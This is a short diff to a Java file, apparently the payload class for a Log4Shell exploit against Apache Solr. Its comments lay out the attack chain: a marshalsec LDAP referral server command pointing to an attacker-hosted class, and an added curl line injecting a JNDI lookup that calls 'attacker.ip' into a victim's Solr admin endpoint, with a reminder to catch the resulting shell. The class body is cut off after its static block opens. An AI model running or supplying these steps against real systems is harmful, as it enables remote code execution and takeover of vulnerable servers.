@@ -1,6 +1,9 @@
 // point the ldap referral server to this Java object using http.server to initiate remote code execution
 // if you have installed marshallsec ldap referral use the following in your terminal
 // java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip.addr:8000/#log4j"
+// initiate exploit with the following in another terminal
+// curl 'http://victim.ip:8983/solr/admin/cores?foo=$\{jndi:ldap://attacker.ip:1389/log4j\}'
+// remember to catch your shell 
 public class log4j {
     static {
         try {
